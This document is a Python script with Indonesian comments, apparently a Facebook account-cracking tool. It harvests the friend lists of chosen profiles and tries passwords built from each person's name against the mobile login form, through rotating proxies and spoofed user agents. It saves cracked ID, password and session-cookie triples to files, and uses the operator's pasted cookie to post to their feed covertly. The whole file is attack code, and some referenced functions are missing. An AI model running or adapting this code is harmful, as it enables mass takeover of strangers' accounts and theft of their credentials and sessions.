###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
tokenefb = []
akunyeh = []
usragent = []
usrgent2 = []
usrgent3 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
ualu,ualuh = [],[]

###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	baz_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[User-agent 0]----------###
uas_bawaan = "Mozilla/5.0 (Linux; Android 11; Infinix X688B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36]"
uas_redmi4a = "Mozilla\/5.0 (Linux; U; Android 6.0; 11; zh-CN; MZ-m3Redmi 4A)8758AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87) note Build\/MRA58K) AppleWebKit\/537.36 (KHTML, like Gecko) Version\/4.0 Chrome\/40.0.2214.89 MZBrowser\/6.9.210-2017112119 UWS\/2.11.0.3284.0.4634.99 Mobile Safari\/537.36"
uas_itelS11 = "Mozilla/5.0 (Linux; Android 6.0; itel S11 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_realme = "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
uas_realme = "Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4400,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/Realme;FBBD/Realme;FBDV/{device_realme};FBSV/{versi_android};FBOP/19"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
#uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(['Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0; iCherry C233 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1','Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1','Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)','Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-E5260) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4438.149 Mobile Safari/537.36'])
###----------[ USER AGENT 1 ]----------###

for agenku in range(10000):

	a='Mozilla/5.0 (Linux; U; Android 11'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c='CPH2207)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 OPR/52.2.2254.54723'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android 10'
	b=random.choice(['7.0.1','8.1.1','9.1.0','10','11'])
	c='SM-G360M)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 OPT/1.7.21'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)

###----------[ USER AGENT 2 ]----------###
for agenkuw in range(10000):
	a='Mozilla/5.0 (Linux; Android 9'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='RMX1801'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='ASUS_Z01QD'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)
  
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

#------[Tahunz]------#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
###----------[ UNTUK ANIMASI ]----------###
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
     
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	baz_bann(f'''{asu}╔═══╦══╦══╗──╔═╗╔═╦═══╗
║╔══╩╣╠╩╣╠╝──╚╗╚╝╔╩╗╔╗║    
║╚══╗║║─║║╔══╗╚╗╔╝─║║║║
║╔══╝║║─║║╚══╝╔╝╚╗─║║║║
║║──╔╣╠╦╣╠╗──╔╝╔╗╚╦╝╚╝║
╚╝──╚══╩══╝──╚═╝╚═╩═══╝''')

###----------[ CEK COKIS TOKEN ]----------###
def login_baz():
	try:
		token = open('.tokenakun.txt','r').read()
		cok = open('.cookiesakun.txt','r').read()
		tokenefb.append(token)
		try:
			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
			nteng = json.loads(gerap.text)['id']
			menu(nteng)
		except KeyError:
			login_men()
		except requests.exceptions.ConnectionError:
			baz_anim(f'└──{mer} koneksimu bermasalah ster :(')
			exit()
	except IOError:
		login_men()
		
###----------[ BAGIAN LOGIN COKIS ]----------###
def login_men():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		print('HELLO WORLD SEKARANG LOGIN DULU')
		cookie=input(f'└── cookies :{xxx}{hijo} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		requests.post(f"https://graph.facebook.com/me/feed?link=https://www.facebook.com/100064820514099/posts/1375232816624490/?substory_index=0&app=fbl&published=0{cookie}&access_token={tok}%s", headers = {"cookie":cookie})
		ken = open(".tokenakun.txt", "w").write(tok)
		cok = open(".cookiesakun.txt", "w").write(cookie)
		baz_anim(f'{bira}└──{hijo} LOGIN BERHASIL SEMOGA HARIMU CERAH')
		waktu(1)
	except Exception as e:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		baz_anim(f'{ung}└──{kun} login gagal ster coba ganti cookies')
		waktu(1)
		login_men()

###----------[ BAGIAN MENU ]----------###
def menu(id):
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		baz_anim(f'└──{mer} cookies telah kadaluarsa ster')
		waktu(1)
		login_men()
	os.system('clear')
	os.system('xdg-open https://www.facebook.com/profile.php?id=100064820514099')
	waktu(1)
	banner()
	print(f'{bira}•{kun}•{hijo}•{asu} HASIL RIKOD FII-XD{hijo}•{kun}•{bira}•')
	print(f'{hijo}>>>•1.Crack Publik')
	print(f'{bira}>>>•2.crack file' )
	print(f'{kun} >>>•3.logout') 
	helpbas = input(f'{hijo}PILIH TER JAN DI LIATIN : ')
	if helpbas in ['publik','Publik','public','PUBLIK','1']:
		nge_krek()
	elif helpbas in ['file','File','files','2']:
		file_dump() 
	elif helpbas in ['exit','3','logout']:
	   hapus_cookie =	os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
	else:
		baz_anim(f'{ung}└──{mer} pilih anjing') 
		baz_anim(f'{ung}└──{mer} aelah lu kgak bener')

###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		baz_anim(f'└──{mer} cookies telah kadaluarsa ster')
		exit()
	print(f'{kun}─────────────────────────────')
	idnyanih = input(f'└── id : ')
	try:
		ambilid = requests.get('https://graph.facebook.com/v1.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
		for proses in ambilid['friends']['data']:
			try:id.append(proses['id']+'|'+proses['name'])
			except:continue
		print(f'└── Idz terkumpul 💩: '+str(len(id)))
		atur_dulu()
	except requests.exceptions.ConnectionError:
		baz_anim(f'{puti}└──{mer} koneksi terputus')
		exit()
	except (KeyError,IOError):
		baz_anim(f'{ung}└──{mer} teman tidak publik')
		baz_anim(f'{ung}└──{mer} coba ganti cookies atau id')
		waktu(1)
		nge_krek()

###----------[ CRACK  FILE ]----------###
def file_dump():
	mz = 0
	bzz = {}
	print(f'{xxx}─────────────────────────────')
	try:baz_gtg = os.listdir('/sdcard/DUMP-FILE/')
	except FileNotFoundError:
		print('└── file dump tidak ada ster ')
		print('└── buat file terlebih dahulu ')
		print('untuk cara buatnya chat wa saya')
		waktu(2)
		exit()
	if len(baz_gtg)==0:
		print('└── file dump tidak ada ster ')
		print('└── buat file terlebih dahulu ')
		waktu(2)
		exit()
	else:
		for file_id in baz_gtg:
			try:pen_file = open('/sdcard/DUMP-FILE/'+file_id,'r').readlines()
			except:continue
			mz+=1
			if mz<100:
				jumh = ''+str(mz)
				bzz.update({str(mz):str(file_id)})
				bzz.update({jumh:str(file_id)})
				print(f'└── %s. %s ({hijo} %s{xxx} )'%(jumh,file_id,len(pen_file)))
			else:
				bzz.update({str(mz):str(file_id)})
				print('['+str(mz)+'] '+file_id+' [ '+str(len(pen_file))+' akun ]'+x)
				print('└── %s. %s ({biru} %s {xxx}) '%(mz,file_id,len(pen_file)))
		_chos_baz = input('└── : ')
		try:gaz_sung = bzz[_chos_baz]
		except KeyError:
			print(f'└── {mer}yang bener milihnya {xxx}')
			waktu(2)
			file_dump()
		try:cekz_ = open('/sdcard/DUMP-FILE/'+gaz_sung,'r').read().splitlines()
		except:
			print('└── {mer}filenya tidak ada ')
			waktu(2)
			exit()
		for idnyh in cekz_:
			id.append(idnyh)
		atur_duluh()
		
def atur_duluh():
	print(f'{xxx}────────────────────────────')
	print('└── 1. akun baru')
	print('└── 2. akun acak')
	aturidh = input(f'{xxx}└── : ')
	if aturidh in ['1','01']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturidh in ['2','02']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		baz_anim(f'{puti}└── {mer}pilih yang bener')
		waktu(1)
		atur_duluh()
		exit()
		
	print(f'{kun}─────────────────────────────')
	print('└── enter untuk mulai')
	print(f'{kun}─────────────────────────────')
	metodh = input(f'')
	if metodh in ['',' ']:
		xbz.append('metodh1')
	else:
		xbz.append('metodh1')
	passwrdh()

def passwrdh():
	global prog,des
	prog = Progress(SpinnerColumn('monkey'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if '><Fiitzy><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metodh1' in xbz:
					gas_krek.submit(metodh1,idf,pwv)
				else:
					gas_krek.submit(metodh1,idf,pwv)
		yhg = '0'
		print(f'{xxx}─────────────────────────────')
		print(f'{hijo}+ {hijo}akun ok✅ : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {kun}akun cp✖️  : {kun}{yhg}{xxx} ')
		print(f'{xxx}─────────────────────────────')

def metodh1(idf,pwv):
	yhn = '0'
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{yhn}')
	prog.advance(des)
	ua = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				open('/sdcard/DAN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
				open('/sdcard/DAN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ ATUR SBLUM KREK ]----------###
def atur_dulu():
	print(f'{xxx}─────────────────────────────')
	print('└── 1. crack baru🐔')
	print('└── 2. crack old🐷')
	print('└── 3. crack random🐵')
	aturid = input(f'{xxx}└── : ')
	if aturid in ['1','01']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['2']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	elif aturid in ['3']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		baz_anim(f'{puti}└──{mer} pilih yang bener')
		waktu(1)
		atur_dulu()
		exit()
		
	print(f'{hijo}─────────────────────────────')
	print('└── 1. mobile|Recomend 1')
	print('└── 2. async |Recomend 3')
	print('└── 3. Free  |Recomend 2')
	metod = input(f'{xxx}└── : ')
	if metod in ['1','01']:
		baz.append('metod1')
	elif metod in ['2','02']:
		baz.append('metod2')
	elif metod in ['3','03']:
		baz.append('metod3')
	else:
		baz.append('metod1')
		
	print(f'{hijo}─────────────────────────────')
	print('└── tambahkan ua y atau t|Recomend ua Redmi or Vivo')
	uatambah = input(f'└── : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		print(f'{kun}─────────────────────────────')
		bzer = input(f'└── ua : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()

###----------[ BAGIAN PASSWRD ]----------###
def passwrd():
	global prog,des
	print(f'{kun}─────────────────────────────')
	print(f'{asu}|────────────────────────────────────|')
	print(f'{asu}|on off mode pesawat setiap 400id men|') 
	print(f'{asu}|OK SAVE IN RESULT sdcard AKUN-OK    |')
	print(f'{asu}|CP SAVE IN RESULT sdcard AKUN-CP    |') 
	print(f'{asu}|────────────────────────────────────|')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for aldous in id2:
				idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if '><basari><' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'metod1' in baz:
					gas_krek.submit(metod1,idf,pwv)
				elif 'metod2' in baz:
					gas_krek.submit(metod2,idf,pwv)
				elif 'metod3' in baz:
					gas_krek.submit(metod3,idf,pwv)
				else:
					gas_krek.submit(metod3,idf,pwv)
		
###----------[ REGULAR ]----------###

def metod1(idf,pwv):

	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				os.popen('play-audio c.mp3')
				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
				os.popen('play-audio o.mp3')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
